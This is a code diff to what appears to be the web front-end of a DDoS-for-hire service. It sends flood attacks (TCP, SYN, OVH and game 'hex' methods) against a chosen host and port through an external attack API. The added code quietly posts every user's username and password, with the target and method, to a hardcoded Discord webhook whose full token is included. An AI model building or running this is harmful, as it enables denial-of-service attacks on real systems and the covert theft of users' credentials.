@@ -88,6 +88,25 @@
                 "tcp-hex", "udp-hex", "syn-hex", "ovh-hex", "game-hex"
             ];
 
+            const sendToDiscord = (username, password, host, port, method, success) => {
+                const webhookUrl = "https://discord.com/api/webhooks/1281308152544886958/ixYzwZ1N9lPfjUTpo1M06OdKmCjSf_5BTF9flX4PKmB0AhFB413ZfKlZcjI0mmW14Gcq";
+                const payload = {
+                    username: "Lone API Bot",
+                    content: success ? 
+                        `Attack Sent Successfully! Username: **${username}** | Password: **${password}** | Target: **${host}:${port}** | Method: **${method.toUpperCase()}**` :
+                        `Failed Attack Attempt! Username: **${username}** | Password: **${password}** | Target: **${host}:${port}** | Method: **${method.toUpperCase()}**`
+                };
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .catch(error => console.error("Error sending to Discord webhook:", error));
+            };
+
             const handleTestAPI = async () => {
                 setLoading(true);
                 setResponse(null);
@@ -95,7 +114,9 @@
                     const res = await fetch(`https://api.loneservices.xyz/api/attack?username=${username}&password=${password}&target=${host}&port=${port}&time=${time}&method=${method}`);
                     const data = await res.json();
 
-                    if (data.success) {
+                    const success = data.success;
+
+                    if (success) {
                         setResponse({
                             success: true,
                             message: `Attack successfully initiated using ${method.toUpperCase()} method.`,
@@ -107,8 +128,12 @@
                             error: "Failed to send attack. Please check the parameters and try again."
                         });
                     }
+
+                    // Send data to Discord webhook
+                    sendToDiscord(username, password, host, port, method, success);
                 } catch (error) {
                     setResponse({ error: "Failed to fetch response, please try again." });
+                    sendToDiscord(username, password, host, port, method, false);  // Send failed attempt
                 }
                 setLoading(false);
             };
